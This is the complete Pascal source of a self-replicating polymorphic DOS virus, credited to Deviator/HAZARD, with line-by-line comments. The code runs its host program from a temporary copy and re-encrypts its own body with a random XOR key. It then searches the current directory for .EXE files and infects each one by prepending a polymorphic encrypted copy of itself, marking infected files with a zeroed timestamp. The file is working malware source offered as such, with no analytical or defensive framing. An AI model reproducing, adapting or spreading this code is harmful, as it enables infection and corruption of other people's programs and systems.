{ World First Polymorphic Parasitic 100% Pascal Virus }
{ By Deviator/HAZARD }

{$M $8000,10000,36000 }
{$I-}
Uses Dos,PePe;					{ Our Units }
Const
OurLen = 6810;					{ Our packed length (Diet) }
GMem = 10000;					{ Temporary mem size }
FName = 'Victim.Exe';				{ Temporary file }
Var
FIn,FOut : File;				{ File In/Out }
OurSt,Temp,Crypted,EC : Pointer;		{ Some pointers }
FSearch : SearchRec;				{ For FindFirst/Next }
NumRead,G,NSize,L,K,H,Attr : Word;		{ Word constants }
B:String;					{ Just for copyleft }
R:Word;						{ ??? }

EHeader : Record				{ Part of Exe header }
          Id      : Word;
          Part    : Word;
          Pages   : Word;
          ReloNum : Word;
          End;

DKey : Byte;					{ Key for decryption }

Begin

Randomize;

B := #13#10'World First Polymorphic 100% Pascal Virus !'#13#10+
     '  Featuring PePe v.1.1 ;) - Pascal Extra Polymorphics Engine !'#13#10;
						{ Copyleft ! }

Assign(FIn,paramstr(0));			{ Open our file }
GetFAttr(FIn,Attr);				{ Drop file attribs }
SetFAttr(Fin,0);
Reset(FIn,1);
Blockread(FIn,EHeader,SizeOf(EHeader));		{ Read header }
Seek(FIn,(EHeader.Pages-1)*512+EHeader.Part);	{ Seek to the end of it }
Blockread(FIn,DKey,1);				{ Read decryption key }
GetMem(OurSt,OurLen);				{ Get mem for our crypted body }
Blockread(FIn,OurSt^,OurLen);			{ Read crypted body }
GetMem(Temp,GMem);				{ Get temp mem }
Assign(Fout,FName);				{ Create temp file }
Rewrite(Fout,1);
Repeat
Blockread(Fin,Temp^,GMem,NumRead);		{ Copy victim (it appended) }
Blockwrite(FOut,Temp^,NumRead);
Until eof(FIn);
Close(FIn);					{ Close It }
SetFAttr(Fin,Attr);
Close(FOut);
Freemem(Temp,GMem);				{ Free mem }

B := '';					{ Create paramstring }
For G := 2 to ParamCount do B := B + ' ' + Paramstr(G);
SwapVectors;
Exec(FName, B);					{ Exec }
SwapVectors;

Assign(Fin,FName);				{ Delete victim }
Erase(Fin);

For NSize := 0 to OurLen do			{ Decrypt our body }
Mem[Seg(OurSt^):Ofs(OurSt^)+NSize] := Mem[Seg(OurSt^):Ofs(OurSt^)+NSize] xor DKey;

DKey := Random($FF);				{ Choose random key }

GetMem(EC,OurLen);
For NSize := 0 to OurLen do			{ Encrypt it }
Mem[Seg(EC^):Ofs(EC^)+NSize] := Mem[Seg(OurSt^):Ofs(OurSt^)+NSize] xor DKey;

GetMem(Crypted,OurLen+3000);
Getmem(Temp,GMem);
NSize := DoPoly(OurSt,OurLen,Crypted);		{ Create poly }

FindFirst('*.ExE',AnyFile,FSearch);		{ Find Exe's }

While DosError = 0 do
Begin
 If FSearch.Time <> 0 then Begin		{ Time of file = 0 ? }
  Assign(FIn,FSearch.Name);			{ Nope, Open it }
  Rename(FIn,FName);				{ Rename it to temporary }
  Assign(Fout,FSearch.Name);		{ Create new file with such name }
  Rewrite(FOut,1);
  GetFAttr(FIn,Attr);				{ Drop file attributes }
  SetFAttr(Fin,0);
  Reset(FIn,1);					{ Open file for reading }
  BlockWrite(FOut,Crypted^,NSize);		{ Write polymorphic copy }
  BlockWrite(FOut,DKey,1);			{ Write decryption key }
  BlockWrite(FOut,EC^,OurLen);			{ Write encrypted body }
  Repeat
  Blockread(FIn,Temp^,GMem,NumRead);		{ Copy victim }
  Blockwrite(FOut,Temp^,NumRead);
  Until eof(Fin);
  SetFTime(FOut,000);				{ Mark }
  Close(Fin);
  SetFAttr(Fin,Attr);				{ Restore attrib }
  Close(FOut);					{ Close File }
  Erase(Fin);					{ Delete victim }
 End;
  FindNext(FSearch);
end;
  FreeMem(Crypted,OurLen+3000);			{ Release mem }
  Freemem(Temp,GMem);
End.
